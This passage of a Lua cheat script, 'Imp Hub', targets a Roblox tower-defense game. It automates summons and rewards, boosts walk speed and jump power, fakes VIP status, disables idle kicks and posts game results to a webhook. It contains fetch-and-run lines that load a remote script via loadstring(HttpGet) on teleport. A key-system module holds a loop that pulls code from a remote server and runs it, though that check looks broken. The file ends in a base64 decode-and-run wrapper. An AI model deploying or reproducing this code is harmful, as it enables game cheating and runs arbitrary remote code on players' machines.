                                Content = "This Name Was Already Set In The File",
                                SubContent = "Record Again With New Name.",
                                Duration = 15
                            }
                        )
                    elseif Recording == false and not Macros[macrotorecord] and macrotorecord ~= "" then
                        Macros[macrotorecord] = macrotorecord
                        writefile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json", Http:JSONEncode(Macros))
                        print("Writed / Rewrited Saved Macros File")
                        writefile("Imp Hub" .. "/SpongebobTD/" .. macrotorecord, Http:JSONEncode(CurrentMacro))
                        print("Saved File")
                        task.wait(0.2)
                        Macros = Http:JSONDecode(readfile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json"))
                        print("Updated Macros")
                        task.wait(0.4)
                        pcall(
                            function()
                                table.clear(Files)
                                for i, v in pairs(
                                    Http:JSONDecode(readfile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json"))
                                ) do
                                    table.insert(Files, i)
                                    macrodrop:SetValues(Files)
                                end
                                print("Cleared Files")
                            end
                        )
                        task.wait(0.1)
                        Fluent:Notify(
                            {
                                Title = "Successfully Saved Macro:",
                                Content = macrotorecord,
                                SubContent = "Added Macro To Saved Macros File.",
                                Duration = 5
                            }
                        )
                        table.clear(CurrentMacro)
                    end
                end
            )
        end
    }
)

Tabs.Main:AddToggle(
    "ReplayMacro",
    {
        Title = "Replay Macro",
        Description = "- Will Replay All Saved Actions From Selected Macro",
        Default = false,
        Callback = function(t)
            Replay = t
            if Replay and macro then
                Fluent:Notify(
                    {
                        Title = "Started Replaying Macro: ",
                        Content = macro,
                        SubContent = "",
                        Duration = 5
                    }
                )
                CompletedActions = {}
                ActionsCompleted = 0
                while Replay do
                    task.wait()
                    pcall(
                        function()
                            ReplayMacro(macro)
                        end
                    )
                end
            elseif Replay and not macro then
                Fluent:Notify(
                    {
                        Title = "Imp Hub",
                        Content = "No Macro Selected.",
                        SubContent = "",
                        Duration = 11
                    }
                )
            end
        end
    }
)

Tabs.Webhook:AddSection("Send Webhooks 📲")

Tabs.Webhook:AddInput(
    "url",
    {
        Title = "Webhook URL",
        Default = "",
        Placeholder = "...",
        Numeric = false,
        Finished = false,
        Callback = function(t)
            url = t
        end
    }
)

Tabs.Webhook:AddToggle(
    "sendonresult",
    {
        Title = "Send Notify On Victory",
        Description = "",
        Default = false,
        Callback = function(t)
            sendonresult = t
            if sendonresult then
                Fluent:Notify(
                    {
                        Title = "Imp Hub",
                        Content = "Webhook Features Has Been Enabled",
                        SubContent = "We Will Notify You When The Game Is Finished ✅",
                        Duration = 5
                    }
                )
            end
        end
    }
)

Tabs.Webhook:AddToggle(
    "allowever",
    {
        Title = "Allow Ping Everyone",
        Description = "- If You Want To Get Pinged Every Finished Game With Webhooks Enabled",
        Default = false,
        Callback = function(t)
            allowever = t
        end
    }
)

Tabs.Summon:AddSection("Summoning 🛒")

Tabs.Summon:AddDropdown(
    "summonamo",
    {
        Title = "Summon Amount",
        Description = "",
        Values = {1, 10},
        Multi = false,
        Default = "",
        Callback = function(t)
            summonamo = t
        end
    }
)

Tabs.Summon:AddDropdown(
    "banner",
    {
        Title = "Banner",
        Description = "",
        Values = {"Standard", "Limited"},
        Multi = false,
        Default = "",
        Callback = function(t)
            banner = t
        end
    }
)

Tabs.Summon:AddToggle(
    "summon",
    {
        Title = "Automatic Summon",
        Description = "- Will Auto Buy Summon",
        Default = false,
        Callback = function(t)
            summon = t
            while summon do
                if summonamo and banner then
                    local args = {
                        banner,
                        summonamo
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                        "sleitnick_knit@1.7.0"
                    ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("UnitService"):WaitForChild("RF"):WaitForChild(
                        "SummonUnits"
                    ):InvokeServer(unpack(args))
                end
            end
        end
    }
)

Tabs.Summon:AddToggle(
    "skip",
    {
        Title = "Skip Animation",
        Description = "- Will Be Auto Skipping",
        Default = false,
        Callback = function(t)
            skip = t
            while skip do
                task.wait()
                pcall(
                    function()
                        VU:Button1Down(Vector2.new(50, 90))
                        VU:Button1Up(Vector2.new(128, 102))

                        VIM:SendKeyEvent(true, 13, false, game)
                        task.wait(0.3)
                        VIM:SendKeyEvent(false, 13, false, game)
                    end
                )
            end
        end
    }
)

Tabs.Lobby:AddSection("Claim 📫")

Tabs.Lobby:AddToggle(
    "claimcquests",
    {
        Title = "Automatic Claim Characters Achievements",
        Description = "- Will Auto Claim All Characters Quests (Patrick, Spongebob, Etc...)",
        Default = false,
        Callback = function(t)
            claimcquests = t
            while claimcquests do
                task.wait(5)
                pcall(
                    function()
                        for i, v in ipairs(
                            game:GetService("Players").LocalPlayer.PlayerGui.Achievements.Main.Content.Right:GetChildren(

                            )
                        ) do
                            if v:IsA("Frame") then
                                for i2, v2 in ipairs(v:GetChildren()) do
                                    if v2:IsA("Frame") then
                                        local args = {
                                            "Achievements",
                                            {
                                                SubCategory = v.Name,
                                                Name = v2.Name,
                                                Category = "Units"
                                            }
                                        }
                                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild(
                                            "_Index"
                                        ):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild(
                                            "Services"
                                        ):WaitForChild("ProgressionService"):WaitForChild("RF"):WaitForChild("Claim"):InvokeServer(
                                            unpack(args)
                                        )
                                    end
                                end
                            end
                        end
                    end
                )
            end
        end
    }
)

Tabs.Lobby:AddToggle(
    "pass",
    {
        Title = "Automatic Claim Pass",
        Description = "- Will Claim All Pass Rewards",
        Default = false,
        Callback = function(t)
            pass = t
            while pass do
                task.wait(6)
                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                    "sleitnick_knit@1.7.0"
                ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("SeasonPassService"):WaitForChild("RF"):WaitForChild(
                    "ClaimAll"
                ):InvokeServer()
            end
        end
    }
)

Tabs.Lobby:AddButton(
    {
        Title = "Claim Daily Reward",
        Description = "- Will Claim All The Daily Rewards Of The Week",
        Callback = function()
            for i = 1, 7 do
                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                    "sleitnick_knit@1.7.0"
                ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("PlaytimeService"):WaitForChild("RF"):WaitForChild(
                    "ClaimDailyReward"
                ):InvokeServer(i)
            end
        end
    }
)

Tabs.Lobby:AddSection("Visual 🧿")

Tabs.Lobby:AddToggle(
    "hasvip",
    {
        Title = "VIP Gamepass",
        Description = "",
        Default = false,
        Callback = function(t)
            hasvip = t
            Plr:SetAttribute("HasVIPGamepass", hasvip)
        end
    }
)

Tabs.Lobby:AddToggle(
    "hasuvip",
    {
        Title = "Ultra VIP Gamepass",
        Description = "",
        Default = false,
        Callback = function(t)
            hasuvip = t
            Plr:SetAttribute("HasUltraVIPGamepass", hasuvip)
        end
    }
)

Tabs.Lobby:AddSection("Units 📚")

Tabs.Lobby:AddButton(
    {
        Title = "Equip Best Pets",
        Description = "",
        Callback = function()
            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                "sleitnick_knit@1.7.0"
            ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("UnitService"):WaitForChild("RF"):WaitForChild(
                "EquipBest"
            ):InvokeServer()
        end
    }
)

Tabs.Lobby:AddButton(
    {
        Title = "Unequip All Pets",
        Description = "",
        Callback = function()
            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                "sleitnick_knit@1.7.0"
            ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("UnitService"):WaitForChild("RF"):WaitForChild(
                "UnequipAll"
            ):InvokeServer()
        end
    }
)

Tabs.Player:AddSlider(
    "Slidper",
    {
        Title = "WalkSpeed",
        Description = "",
        Default = 20,
        Min = 20,
        Max = 5000,
        Rounding = 1,
        Callback = function(t)
            Num = t
        end
    }
)

Tabs.Player:AddToggle(
    "wlk",
    {
        Title = "Set WalkSpeed",
        Description = "",
        Default = false,
        Callback = function(t)
            AutoSpeed = t
            while AutoSpeed do
                task.wait(0.001)
                pcall(
                    function()
                        Plr.Character.Humanoid.WalkSpeed = tonumber(Num)
                    end
                )
            end
        end
    }
)

Tabs.Player:AddSlider(
    "Slidpeer",
    {
        Title = "JumpPower",
        Description = "",
        Default = 20,
        Min = 20,
        Max = 500,
        Rounding = 1,
        Callback = function(t)
            Numm = t
        end
    }
)

Tabs.Player:AddToggle(
    "eyeh",
    {
        Title = "Set JumpPower",
        Description = "",
        Default = false,
        Callback = function(t)
            AutoJump = t
            while AutoJump do
                task.wait(0.001)
                pcall(
                    function()
                        Plr.Character.Humanoid.JumpPower = tonumber(Numm)
                    end
                )
            end
        end
    }
)

Tabs.Credits:AddParagraph(
    {
        Title = "Credits To:",
        Content = "alan11ago"
    }
)

Tabs.Credits:AddButton(
    {
        Title = "Copy Discord Server Invitation",
        Description = "It Copys To Clipboard The Invitatiom To Server",
        Callback = function()
            setclipboard("https://dsc.gg/imphub")
            Fluent:Notify(
                {
                    Title = "Imp Hub",
                    Content = "¡Copied Invitation!",
                    SubContent = "https://dsc.gg/imphub",
                    Duration = 5
                }
            )
        end
    }
)

Tabs.Settings:AddToggle(
    "autoexecute",
    {
        Title = "Auto Execute",
        Description = "Will Hub On Place Teleport",
        Default = false,
        Callback = function(t)
            autoexec = t
            if autoexec then
                queue_on_teleport(
                    [[
           repeat task.wait()
           until game:IsLoaded() loadstring(game:HttpGet("https://raw.githubusercontent.com/alan11ago/Hub/refs/heads/main/ImpHub.lua"))()]]
                )
            end
        end
    }
)

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)

SaveManager:IgnoreThemeSettings()

SaveManager:SetIgnoreIndexes({})

InterfaceManager:SetFolder("ImpHub")
SaveManager:SetFolder("ImpHub/SpongebobTD")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)

Fluent:Notify(
    {
        Title = "Imp Hub",
        Content = "The Script Has Been Loaded.",
        Duration = 8
    }
)

if workspace:FindFirstChild("Friendlies") then
    workspace.Friendlies.ChildAdded:Connect(
        function(v)
            task.wait(0.6)
            if tostring(v:GetAttribute("OwnerId")) == tostring(Plr.UserId) and Recording == true then
                SaveAction(
                    "Place",
                    {
                        unit = v.Name,
                        cframe = tostring(v.WorldPivot),
                        wave = game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Top.Main.StageInfo.Frame.CurrentWave.Text:gsub(
                            "%D",
                            ""
                        ),
                        requiredmoney = GetCost(v.Name)
                    }
                )
                print("Placed Unit: " .. v.Name .. " CFrame: " .. tostring(v.RootPart.CFrame))
            end

            v:GetAttributeChangedSignal("AttackMode"):Connect(
                function()
                    if Recording and tostring(v:GetAttribute("OwnerId")) == tostring(Plr.UserId) then
                        SaveAction(
                            "Priority",
                            {
                                cframe = tostring(v.PrimaryPart.Position),
                                priority = v:GetAttribute("AttackMode"),
                                wave = game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Top.Main.StageInfo.Frame.CurrentWave.Text:gsub(
                                    "%D",
                                    ""
                                ),
                                unit = v.Name
                            }
                        )
                    end
                end
            )
            v:GetAttributeChangedSignal("Upgrade"):Connect(
                function()
                    if Recording and tostring(v:GetAttribute("OwnerId")) == tostring(Plr.UserId) then
                        SaveAction(
                            "Upgrade",
                            {
                                cframe = tostring(v.PrimaryPart.Position),
                                upgrade = v:GetAttribute("Upgrade"),
                                wave = game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Top.Main.StageInfo.Frame.CurrentWave.Text:gsub(
                                    "%D",
                                    ""
                                ),
                                unit = v.Name
                            }
                        )
                    end

                    if upgon then
                        Fluent:Notify(
                            {
                                Title = "Imp Hub",
                                Content = v.Name .. " Has Upgraded To:",
                                SubContent = tostring(v:GetAttribute("Upgrade")) .. " Upgrades",
                                Duration = 5
                            }
                        )
                    end
                end
            )
        end
    )
end

if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("RoundSummary") then
    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary:GetPropertyChangedSignal("Enabled"):Connect(
        function()
            if sendonresult then
                task.wait(0.6)
                local Headers = {
                    ["Content-Type"] = "application/json"
                }
                local diff =
                    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.RoundData.StageInfo.Difficulty.Text or
                    "Error"
                local world =
                    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.RoundData.StageInfo.WorldTitle.Text or
                    "Map Not Found"
                local chapter =
                    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.RoundData.StageInfo.ChapterTitle.Text or
                    "No Chapter"
                local waves =
                    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.RoundData.RoundStats.Waves.Amount.Text or
                    "0"
                local unitsplaced =
                    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.RoundData.RoundStats.UnitsPlaced.Amount.Text or
                    "0"
                local dmg =
                    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.RoundData.RoundStats.TotalDamage.Amount.Text or
                    "nil"
                local kills =
                    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.RoundData.RoundStats.Takedowns.Amount.Text or
                    "0"
                local time =
                    game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.RoundData.RoundStats.Playtime.Amount.Text or
                    "0:00"
                local units = ""
                local success, err =
                    pcall(
                    function()
                        for i, v in ipairs(
                            game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.UnitsXP:GetChildren(

                            )
                        ) do
                            if v:IsA("Frame") and v:FindFirstChild("Unit") and v:FindFirstChild("XPBar") then
                                units =
                                    units ..
                                    "**" ..
                                        " Unit: " ..
                                            "**" ..
                                                v.Name ..
                                                    " | Level: " ..
                                                        v.Unit.TowerInfo.Level.Text:gsub("<[^>]+>", "") ..
                                                            " | XP Gained: " ..
                                                                v.XPBar.Bar.XP.Text ..
                                                                    " | Rarity: " .. v.Rarity.Text .. "\n"
                            end
                        end
                    end
                )

                local function GetTitle()
                    if allowever then
                        return "@everyone Username: " .. "||" .. Plr.Name .. "||"
                    else
                        return "Username: " .. "||" .. Plr.Name .. "||"
                    end
                end

                if not success then
                    units = "Error Getting Units Progress."
                end
                local Data = {
                    ["embeds"] = {
                        {
                            ["title"] = GetTitle(),
                            ["description"] = "** Spongebob Tower Defense ** | ¡An Game Has Just Finished!",
                            ["type"] = "rich",
                            ["color"] = 39955,
                            ["fields"] = {
                                {name = "[📊] Progress", value = units, inline = false},
                                {name = "[🛤] Map: ", value = world, inline = true},
                                {name = "[⏳] Timer: ", value = time, inline = true},
                                {name = "[🎯] Waves Cleared: ", value = waves, inline = true},
                                {name = "[♻️] Difficulty: ", value = diff, inline = true},
                                {name = "[📥] Chapter: ", value = chapter, inline = true},
                                {name = "[📍] Kills: ", value = kills, inline = true},
                                {name = "[🗡] Damage Dealed: ", value = dmg, inline = true},
                                {name = "[🗃] Placed Units: ", value = unitsplaced, inline = true},
                                {
                                    name = "[📈] Player Level: ",
                                    value = string.match(
                                        game:GetService("Players").LocalPlayer.PlayerGui.HUD.Bottom.Leveling.Progression.Text,
                                        "Level %d+"
                                    ),
                                    inline = true
                                }
                            },
                            ["footer"] = {
                                text = "You Has Just Finished A Game At: " .. os.date("%c")
                            }
                        }
                    }
                }

                local Request = http_request or request or HttpPost
                Request({Url = url, Body = Http:JSONEncode(Data), Method = "POST", Headers = Headers})
                Fluent:Notify(
                    {
                        Title = "Imp Hub",
                        Content = "Successfully Sended Webhook To:",
                        SubContent = url,
                        Duration = 15
                    }
                )
            end

            game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.Return.MouseButton1Click:Connect(
                function()
                    CompletedActions = {}
                end
            )
            game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.Actions.Next.MouseButton1Click:Connect(
                function()
                    CompletedActions = {}
                end
            )

            game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.Actions.Replay.MouseButton1Click:Connect(
                function()
                    CompletedActions = {}
                end
            )
        end
    )
end

for i, v in pairs(getconnections(Plr.Idled)) do
    v:Disable()
end

end

local isLoggingIn = false

local PandaAuth = {}

local uptimeCheck = "sc1pnzhtj9ch54lmabdfglmwvlw7xmbisfmryknnz8"
local content = "c2mxcg5asfrqounontrstufirgzhte1xvkx3n3hnyklzzm1swutotitaod0"
local agent = "pandaauth"

local Validation_Delay = 3
getgenv().setclipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
getgenv().AllowLibNotification = true
getgenv().CustomLogo = "14317130710"

local TemporaryAccess = false

getgenv().AutomaticFailsafe = false

getgenv().SecureMode = false

getgenv().Panda_ProcessingStat = false

local http_service = cloneref(game:GetService("HttpService"))
local rbx_analytics_service = cloneref(game:GetService("RbxAnalyticsService"))
local starter_gui_service = cloneref(game:GetService("StarterGui"))
local players_service = cloneref(game:GetService("Players"))
local _tostring = clonefunction(tostring)

local server_configuration = "https://pandadevelopment.net"

local LibVersion = "v2.5.90 (05-30-2024)"

local validation_service = server_configuration .. "/v2_validation"

local function PandaVanguard_Run()
    -- empty
end

local function Get_RequestData(data_link)
    if getgenv().Panda_ProcessingStat then
        warn("Your Command has been Throttle, Please Wait....")
        return "No_Data"
    end

    getgenv().Panda_ProcessingStat = true
    local DataResponse =
        request(
        {
            Url = data_link,
            Method = "GET",
            Headers = {
                ["x-uptime-check"] = uptimeCheck,
                ["x-content-type"] = content,
                ["user-agent"] = agent
            }
        }
    )

    getgenv().Panda_ProcessingStat = false

    if DataResponse.StatusCode == 200 then
        return DataResponse.Body
    else
        if DataResponse.StatusCode == 429 then
            -- Too many requests
        elseif DataResponse.StatusCode == 500 then
            -- Internal Error
        elseif DataResponse.StatusCode == 403 then
            -- Unable to Access the Server
        else
            -- Unknown Error on Server
        end
        return "No_Data"
    end
end

local function GetHardwareID(service)
    PandaVanguard_Run()

    local client_id = rbx_analytics_service:GetClientId()
    local success, jsonData =
        pcall(
        function()
            return http_service:JSONDecode(
                Get_RequestData(server_configuration .. "/serviceapi?service=" .. service .. "&command=getconfig")
            )
        end
    )
    if success then
        if jsonData.AuthMode == "playerid" then
            return _tostring(players_service.LocalPlayer.UserId)
        elseif jsonData.AuthMode == "hwidplayer" then
            return client_id .. players_service.LocalPlayer.UserId
        elseif jsonData.AuthMode == "hwidonly" then
            return client_id
        elseif jsonData.AuthMode == "fingerprint" then
            local GetFingerprint = Get_RequestData(server_configuration .. "/fingerprint")
            return tostring(GetFingerprint)
        else
            return players_service.LocalPlayer.UserId
        end
    else
        return client_id
    end
end

local function AutomaticHTTPExec(identifier)
    if AutomaticHTTPExec == "vegax" or AutomaticHTTPExec == "evon" then
        local No_Execute = "Script_Not_Found"
        local UUID = GetHardwareID(identifier)
        task.spawn(
            function()
                while true do
                    task.wait()
                    local content = game:HttpGet("https://utility.pandadevelopment.net/readcontent?playerid=" .. UUID)
                    if content ~= No_Execute then
                        local success, result = pcall(function()
                                runcode(content)
                                game:HttpGet("https://utility.pandadevelopment.net/clear?playerid=" .. UUID)
                            end
                        )
                        if not success then
                            warn("Error executing loaded code:", result)
                            game:HttpGet("https://utility.pandadevelopment.net/clear?playerid=" .. UUID)
                        end
                    end
                end
            end
        )
    end
end

local function PandaLibNotification(message)
    if AllowLibNotification then
        starter_gui_service:SetCore(
            "SendNotification",
            {
                Title = "Key System",
                Text = message,
                Duration = 6,
                Icon = "rbxassetid://" .. CustomLogo
            }
        )
    end
end

function PandaAuth:Version()
    return LibVersion
end

function PandaAuth:GetKey(Exploit)
    if TemporaryAccess then
        local TempKey =
            server_configuration .. "/getkey?service=" .. Exploit .. "&hwid=" .. players_service.LocalPlayer.UserId
        return TempKey
    end
    if Exploit == "vegax" then
        local VegaExclusive =
            server_configuration .. "/getkey?service=vegax&hwid=" .. GetHardwareID(Exploit) .. "&provider=linkvertise"
        return VegaExclusive
    end
    local user_link = server_configuration .. "/getkey?service=" .. Exploit .. "&hwid=" .. GetHardwareID(Exploit)
    PandaLibNotification(user_link)
    return user_link
end

function PandaAuth:GetLink(Exploit)
    if TemporaryAccess then
        local TempKey =
            server_configuration .. "/getkey?service=" .. Exploit .. "&hwid=" .. players_service.LocalPlayer.UserId
        return TempKey
    end
    if Exploit == "vegax" then
        local VegaExclusive =
            server_configuration .. "/getkey?service=vegax&hwid=" .. GetHardwareID(Exploit) .. "&provider=linkvertise"
        return VegaExclusive
    end
    local user_link = server_configuration .. "/getkey?service=" .. Exploit .. "&hwid=" .. GetHardwareID(Exploit)
    PandaLibNotification(user_link)
    return user_link
end

function PandaAuth:ValidateKey(serviceID, ClientKey)
    if ClientKey == "" then
        return false
    end
    if TemporaryAccess then
        return true
    end
    PandaVanguard_Run()
    wait(Validation_Delay)
    local Data =
        Get_RequestData(
        validation_service .. "?hwid=" .. GetHardwareID(serviceID) .. "&service=" .. serviceID .. "&key=" .. ClientKey
    )
    if Data == "No_Data" then
        if getgenv().AutomaticFailsafe then
            return true
        end
        return false
    end
    local success, data =
        pcall(
        function()
            return http_service:JSONDecode(Data)
        end
    )
    if success and data["V2_Authentication"] == "success" then
		AutomaticHTTPExec(serviceID)
        return true
    end
    return false
end

function PandaAuth:ValidatePremiumKey(serviceID, ClientKey)
    if ClientKey == "" then
        return false
    end
    if TemporaryAccess then
        return true
    end
    PandaVanguard_Run()
    wait(Validation_Delay)
    local Data =
        Get_RequestData(
        validation_service .. "?hwid=" .. GetHardwareID(serviceID) .. "&service=" .. serviceID .. "&key=" .. ClientKey
    )
    if Data == "No_Data" then
        if getgenv().AutomaticFailsafe then
            return true
        end
        return false
    end
    local success, data =
        pcall(
        function()
            return http_service:JSONDecode(Data)
        end
    )
    if success and data["V2_Authentication"] == "success" and data["Key_Information"]["Premium_Mode"] == true then
	    AutomaticHTTPExec(serviceID)
        return true
    end
    return false
end

function PandaAuth:ValidateNormalKey(service_name, Key)
    return PandaAuth:ValidateKey(service_name, Key)
end

function PandaAuth:Authenticate_Keyless(service_name)
    return PandaAuth:ValidateKey(service_name, "keyless")
end

function PandaAuth:AuthorizedKyRBLX(serviceID, ClientKey, isPremium)
    if TemporaryAccess then
        return true
    end
    if isPremium then
        return PandaAuth:ValidatePremiumKey(serviceID, ClientKey)
    else
        return PandaAuth:ValidateKey(serviceID, ClientKey)
    end
end

function PandaAuth:ResetHardwareID(ServiceID, oldKey)
    PandaVanguard_Run()
    local service_name = string.lower(ServiceID)

    local whatthe =
        request(
        {
            Url = server_configuration ..
                "/serviceapi/edit/hwid/?service=" ..
                    service_name ..
                        "&key=" .. oldKey .. "&newhwid=" .. game:GetService("RbxAnalyticsService"):GetClientId(),
            Method = "POST",
            Headers = {
                ["x-uptime-check"] = uptimeCheck,
                ["x-content-type"] = content,
                ["user-agent"] = agent
            }
        }
    ).Body
end

function PandaAuth:SetHTTPProtocol(IPv4)
    print("This Feature has been Removed")
end

local ServiceID = "imphub"

Progress.Login:SetKeyLink(PandaAuth:GetKey(ServiceID))

local window = Progress.Window
local function CheckKey(key)
	isLoggingIn = true
	task.spawn(window.SetLoadingState, window, isLoggingIn)
	local result = PandaAuth:ValidateKey(ServiceID, key)
	isLoggingIn = false
	task.spawn(window.SetLoadingState, window, isLoggingIn)
	return result
end

Progress.Login.OnLogin = function(key)
	if not isLoggingIn then
		local keyResult = CheckKey(key)
		if keyResult then
			task.spawn(function()
				Progress:ShowToast({
					Text = "Valid Key!",
					Duration = 2.5
				})
				TheScript()
			end)
			if writefile then
				writefile("ImpKey.txt", key)
				Progress:ShowToast({
					Text = "Saved Key Successfully!",
					Duration = 4.5
				})
			end
		else
			task.spawn(window.ShowDialog, window, {
				Title = "Error Checking Key",
				Text = "Your key may be expired or invalid due to an HWID mismatch. If you recently switched or reinstalled executors, please reset your hwid, you can try validating again for make sure its key error, this can be also that the executor ain't supporting our key system (mostly of cases)."
			})
		end
	end
end

if not isLoggingIn and isfile and readfile and isfile("ImpKey.txt") then
	if CheckKey(readfile("ImpKey.txt")) then
		task.spawn(function()
			Progress:ShowToast({
				Text = "Valid Key From Storage!",
				Duration = 2.75
			})
			TheScript()
		end)
	elseif delfile then
		delfile("ImpKey.txt")
	end
end

if identifyexecutor then
    if identifyexecutor() == "Swift" then
        task.spawn(window.ShowDialog, window, {
				Title = "Executor Not Supported",
				Text = "This Executor Ain't Supported By Imp Hub Key System, If Do You Want Any Other Free Windows Executor Option, U Can Use Argon/Cryptic Windows Which Are Also Free."
			})
    end
end

return PandaAuth"
local function decode_and_run()
    local decoded = base64.decode(SshEhIbiNX)
    local chunk = loadstring(decoded)
    if chunk then
        chunk()
    else
        error("Failed to decode and execute script")
    end
end
decode_and_run()
